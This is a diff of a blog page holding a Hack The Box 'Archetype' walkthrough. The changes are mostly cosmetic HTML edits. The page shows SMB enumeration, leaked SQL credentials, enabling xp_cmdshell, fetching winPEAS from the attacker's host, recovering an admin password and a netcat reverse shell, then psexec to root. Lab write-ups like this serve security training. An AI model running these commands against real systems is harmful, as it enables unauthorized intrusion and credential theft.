@@ -197,7 +197,7 @@ me at <strong><a href="mailto:matteolugli18@gmail.com">matteolugli18@gmail.com</
 <hr>
 <h2 id="enumeration">Enumeration<a href="#enumeration" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>I always start htb boxes with nmap enumeration.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV Archetype
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo nmap -sC -sV Archetype
 Starting Nmap 7.92 <span style="color:#f92672">(</span> https://nmap.org <span style="color:#f92672">)</span> at 2022-09-21 18:40 CEST
 Nmap scan report <span style="color:#66d9ef">for</span> Archetype <span style="color:#f92672">(</span>10.129.206.73<span style="color:#f92672">)</span>
 Host is up <span style="color:#f92672">(</span>0.59s latency<span style="color:#f92672">)</span>.
@@ -276,7 +276,7 @@ you are interested.</p>
 <h2 id="smb-client">SMB client<a href="#smb-client" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Given what we discovered during enumeration, the simplest thing to
 try is connecting to the machine using SMB client.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N -L Archetype
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N -L Archetype
 
      Sharename       Type      Comment
      ---------       ----      -------
@@ -293,7 +293,7 @@ on a particular server.</li>
 </ul>
 <p>We notice the share called <strong>backups</strong>, which is the only non-admin share,
 that we might be able to access. Let&rsquo;s do it using this command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N <span style="color:#ae81ff">\\\\</span>Archetype<span style="color:#ae81ff">\\</span>backups
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">smbclient -N <span style="color:#ae81ff">\\\\</span>Archetype<span style="color:#ae81ff">\\</span>backups
 smb: <span style="color:#ae81ff">\&gt;</span> ls
 ls
   .                                   D        <span style="color:#ae81ff">0</span>  Mon Jan <span style="color:#ae81ff">20</span> 13:20:57 <span style="color:#ae81ff">2020</span>
@@ -303,7 +303,7 @@ ls
 	      <span style="color:#ae81ff">5056511</span> blocks of size 4096. <span style="color:#ae81ff">2616242</span> blocks available
 </code></pre></div><p>Looks like there is a suspicious file: prod.dtsConfig.
 Let&rsquo;s take a peek and check what&rsquo;s in there:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">get prod.dtsConfig
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">get prod.dtsConfig
 
 &lt;DTSConfiguration&gt;
     &lt;DTSConfigurationHeading&gt;
@@ -324,7 +324,7 @@ You can find the download links here</p>
 <p><a href="https://www.secureauth.com/labs/open-source-tools/impacket/">https://www.secureauth.com/labs/open-source-tools/impacket/</a></p>
 <p>At the beginning I struggled with finding the documentation for this tool, so i just runned
 the script with no options:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
 
 usage: mssqlclient.py <span style="color:#f92672">[</span>-h<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-port PORT<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-db DB<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-windows-auth<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-debug<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-file FILE<span style="color:#f92672">]</span>
 		      <span style="color:#f92672">[</span>-hashes LMHASH:NTHASH<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-no-pass<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-k<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>-aesKey hex key<span style="color:#f92672">]</span>
@@ -344,7 +344,7 @@ options:
   -debug                Turn DEBUG output ON
   -file FILE            input file with commands to execute in the SQL shell
 </code></pre></div><p>After a little bit i figured out the correct way to write the command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 mssqlclient.py Archetype/sql_svc@10.129.206.73 -windows-auth
 &lt;client.py Archetype/sql_svc@10.129.206.73 -windows-auth
 Impacket v0.9.24 - Copyright <span style="color:#ae81ff">2021</span> SecureAuth Corporation
 
@@ -359,7 +359,7 @@ Password:&lt;insert password&gt;
 <span style="color:#f92672">[</span>!<span style="color:#f92672">]</span> Press help <span style="color:#66d9ef">for</span> extra shell commands
 </code></pre></div><p>There we go, looks like we can send commands, so i tried
 to run a simple query:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SQL&gt; <span style="color:#66d9ef">select</span> name from sys.databases
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">SQL&gt; <span style="color:#66d9ef">select</span> name from sys.databases
 master
 tempdb
 model
@@ -368,7 +368,7 @@ msdb
 <h2 id="command-shell">Command Shell<a href="#command-shell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>I found out that there is a way to execute commands remotly if we have access
 to a ms-sql server: we can use a <em>stored procedure</em> called <strong>xp_cmdshell</strong>.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;dir *.exe&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;dir *.exe&#39;</span>;
 
 [<span style="color:#f92672">-</span>] ERROR(ARCHETYPE): Line <span style="color:#ae81ff">1</span>: <span style="color:#66d9ef">SQL</span> Server blocked <span style="color:#66d9ef">access</span> <span style="color:#66d9ef">to</span> <span style="color:#66d9ef">procedure</span> <span style="color:#e6db74">&#39;sys.xp_cmdshell&#39;</span>
 <span style="color:#66d9ef">of</span> component <span style="color:#e6db74">&#39;xp_cmdshell&#39;</span> because this component <span style="color:#66d9ef">is</span> turned <span style="color:#66d9ef">off</span> <span style="color:#66d9ef">as</span> part <span style="color:#66d9ef">of</span> the <span style="color:#66d9ef">security</span> configuration <span style="color:#66d9ef">for</span> this server.
@@ -380,7 +380,7 @@ is disabled in the configuration file. Let&rsquo;s try to follow the suggestion
 given by the error prompt ('[&hellip;] <em>A system administrator can enable the use of &lsquo;xp_cmdshell&rsquo; by using sp_configure</em>.').</p>
 <p>With a quick google search i found out the correct way of using <strong>sp_configure</strong> to
 enable the shell. (Maybie we are lucky and we can do it without admin privileges).</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
 sp_configure <span style="color:#e6db74">&#39;show advanced options&#39;</span>, <span style="color:#e6db74">&#39;1&#39;</span>
 [<span style="color:#f92672">*</span>] INFO(ARCHETYPE): Line <span style="color:#ae81ff">185</span>: Configuration <span style="color:#66d9ef">option</span> <span style="color:#e6db74">&#39;show advanced options&#39;</span> changed <span style="color:#66d9ef">from</span> <span style="color:#ae81ff">0</span> <span style="color:#66d9ef">to</span> <span style="color:#ae81ff">1</span>. Run the RECONFIGURE <span style="color:#66d9ef">statement</span> <span style="color:#66d9ef">to</span> install.
 <span style="color:#66d9ef">SQL</span><span style="color:#f92672">&gt;</span> reconfigure
@@ -403,10 +403,10 @@ with <em>privilege escalation</em> on windows machines.
 It was originally made to enumerate all the possible ways or methods to get admin privileges on a Windows machine.
 To install it on kali or any debian-based distribution you can use the following
 command:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install peass
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo apt install peass
 </code></pre></div><p>Use this other command to locate all the executable files that you
 just downloaded:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">winpeas --help
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">winpeas --help
 &gt; peass ~ Privilege Escalation Awesome Scripts SUITE
 
 /usr/share/peass/winpeas
@@ -423,12 +423,12 @@ machine (that is by-default listening on port 8000).
 <strong><em>Remember to run the command from the directory where the winpeas .exe
 files are stored!</em></strong> (I lost a lot of time on this one point).</p>
 <p>The directory should be /usr/share/peass/winpeas.</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">python3 -m http.server
 </code></pre></div><p>Now we can use <strong>powershell</strong> to inject the file!</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe wget http://10.10.17.61:8000/winPEASx64.exe -OutFile c:\\Users\Public\\winPEASx64.exe&#39;</span>;
 </code></pre></div><p>The file should be loaded in the target machine. Now it&rsquo;s just matter
 of executing it:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;c:\\Users\Public\\winPEASx64.exe&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;c:\\Users\Public\\winPEASx64.exe&#39;</span>;
 
 [...]
 <span style="color:#960050;background-color:#1e0010">╔══════════╣</span> <span style="color:#66d9ef">Found</span> History Files
@@ -439,7 +439,7 @@ File: <span style="color:#66d9ef">C</span>:<span style="color:#960050;background
 [...]
 </code></pre></div><p>History files are usually vulnerable and a good source of information,
 let&rsquo;s see what&rsquo;s inside:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&#39;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#39;powershell.exe cat C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt&#39;</span>;
 
 net.exe use T: <span style="color:#960050;background-color:#1e0010">\\</span>Archetype<span style="color:#960050;background-color:#1e0010">\</span>backups <span style="color:#f92672">/</span><span style="color:#66d9ef">user</span>:administrator MEGACORP_4dm1n<span style="color:#f92672">!!</span>
 </code></pre></div><p>We found administrator credentials!</p>
@@ -450,7 +450,7 @@ net.exe use T: <span style="color:#960050;background-color:#1e0010">\\</span>Arc
 <h2 id="reverseshell">ReverseShell<a href="#reverseshell" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
 <p>Now that we have admin credentials, it&rsquo;s time to spawn a reverse-shell.</p>
 <p><a href="https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/">https://pentestwiki.org/academy/how-to-get-a-xp_cmdshell-reverse-shell/</a></p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#34;c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe&#34;</span>;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">EXEC</span> xp_cmdshell <span style="color:#e6db74">&#34;c:\\Users\Public\\nc.exe 10.10.17.61 9999 -e cmd.exe&#34;</span>;
 </code></pre></div><p>Now we can just navigate to C:\Users\sql_svc\Desktop and get the
 user flag.
 We are not done yet, because we still have to find the <strong>root flag</strong>.</p>
@@ -459,10 +459,10 @@ cmd prompt, so we need to find a way to spawn a shell <em>as administrator</em>.
 Guess what, impacket will help us one more time!
 <a href="https://blog.ropnop.com/using-credentials-to-own-windows-boxes">https://blog.ropnop.com/using-credentials-to-own-windows-boxes</a></p>
 <p>We can use <strong>psexec.py</strong> to do exactly what we need:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psexec.py Archetype/administrator@10.129.189.185
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">psexec.py Archetype/administrator@10.129.189.185
 </code></pre></div><p>Now just navigate to C:\Users\Administrator\Desktop and get
 the root flag. You can use</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">more root.txt
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">more root.txt
 </code></pre></div><blockquote>
 <p>root flag &ndash;&gt; b91ccec3305e98240082d4474b848528</p>
 </blockquote>
@@ -477,6 +477,13 @@ the root flag. You can use</p>
         <hr />
     </div>
     <div class="pagination__buttons">
+        
+        <span class="button previous">
+            <a href="/posts/about_this_website/">
+                <span class="button__icon">←</span>
+                <span class="button__text">About this website</span>
+            </a>
+        </span>
         
         
         <span class="button next">
@@ -504,7 +511,7 @@ the root flag. You can use</p>
   <div class="footer__inner">
     
       <div class="copyright">
-        <span>© 2022 Powered by <a href="http://gohugo.io">Hugo</a></span>
+        <span>© 2023 Powered by <a href="http://gohugo.io">Hugo</a></span>
     
         <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
       </div>
